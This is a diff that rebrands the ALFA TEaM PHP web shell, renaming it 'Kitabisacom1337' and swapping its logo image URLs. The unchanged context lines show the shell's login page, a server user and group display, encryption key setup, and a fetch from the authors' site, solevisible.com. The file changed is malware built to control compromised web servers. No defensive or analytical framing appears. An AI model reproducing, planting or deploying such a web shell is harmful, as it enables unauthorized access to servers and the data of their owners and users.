@@ -179,7 +179,7 @@ if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_
 if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
 define("__KITABISACOM1337_VERSION__", "4.1");
 define("__KITABISACOM1337_UPDATE__", "2");
-define("__KITABISACOM1337_CODE_NAME__", "Tesla");
+define("__KITABISACOM1337_CODE_NAME__", "Kitabisacom1337");
 define("__KITABISACOM1337_DATA_FOLDER__", "KITABISACOM1337_DATA");
 define("__KITABISACOM1337_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
 define("__KITABISACOM1337_SECRET_KEY__", __KITABISACOM1337_POST_ENCRYPTION__?_AlfaSecretKey():'');
@@ -533,7 +533,7 @@ body{background: black;}
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
 <title>.: Kitabisacom1337 :.</title><center>
-<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/GMTyQpB/KITABISACOM2.png" /></center>
+<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/XpWzW3h/KITABISACOM3.png" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
 <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__KITABISACOM1337_VERSION__.'-'.__KITABISACOM1337_CODE_NAME__.' ~</b></font></th></tr>
@@ -1109,7 +1109,7 @@ echo '<input type="hidden" name="charset">
 <tr>
 <td><span class="header_vars">User:</span></td>
 <td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
-<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/GMTyQpB/KITABISACOM2.png" /></td>
+<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/XpWzW3h/KITABISACOM3.png" /></td>
 </tr>
 <tr>
 <td><span class="header_vars">PHP:</span></td>
@@ -1559,7 +1559,7 @@ echo '<div class="header">';
 $news = new AlfaCURL();
 $about_us = $news->Send("http://solevisible.com/aboutus.php");
 if(empty($about_us)){
-$about_us = "<pre><center><img src='https://i.ibb.co/GMTyQpB/KITABISACOM2.png'><br>
+$about_us = "<pre><center><img src='https://i.ibb.co/XpWzW3h/KITABISACOM3.png'><br>
 <b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
 <font color='#00A220'>Shell Coded By Sole Sad & Invisible (ALFA TEaM)</font><br>
 <font color='#00A220'>Contact : solevisible@gmail.com</font><br>
